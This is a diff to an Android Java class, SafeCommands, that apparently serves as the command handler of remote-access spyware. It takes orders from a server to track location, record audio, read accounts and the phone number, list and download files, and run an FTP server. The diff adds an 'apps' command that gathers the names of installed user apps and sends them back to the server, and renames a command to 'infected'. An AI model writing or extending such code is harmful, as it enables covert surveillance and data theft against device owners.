@@ -5,6 +5,9 @@ import android.accounts.AccountManager;
 import android.app.AlertDialog;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.ResolveInfo;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.wifi.ScanResult;
@@ -15,6 +18,8 @@ import android.os.Build;
 import android.os.Environment;
 import android.telephony.TelephonyManager;
 import android.text.format.Formatter;
+import android.util.Log;
+import android.util.StringBuilderPrinter;
 import android.widget.Toast;
 
 import java.io.File;
@@ -38,8 +43,8 @@ public class SafeCommands {
             "respond", "location start", "location stop", "location single",
             "audio start", "audio stop", "toast ", "dialog ", "wifi",
             "accounts", "phone number", "ls ", "download ", "commands",
-            "version", "app", "address", "timeout ", "status", "getlog",
-            "ftp start", "ftp stop"};
+            "version", "infected", "address", "timeout ", "status", "getlog",
+            "ftp start", "ftp stop", "apps"};
 
 
     public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger,
@@ -113,6 +118,8 @@ public class SafeCommands {
             }
         } else if (fromServer.equalsIgnoreCase(COMMANDS[21])) {
             ftpServer.stopServer();
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[22])) {
+            installedApps();
         }
     }
 
@@ -224,8 +231,18 @@ public class SafeCommands {
         comms.say("########################################################");
     }
 
-    private void crash(){
-
+    private void installedApps() {
+        StringBuilder sbApps = new StringBuilder();
+        sbApps.append("Installed apps:\r\n");
+        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
+        for (int i = 0; i < packList.size(); i++) {
+            PackageInfo packInfo = packList.get(i);
+            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                sbApps.append(packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
+                sbApps.append("\r\n");
+            }
+        }
+        comms.say(sbApps.toString());
     }
 
 }
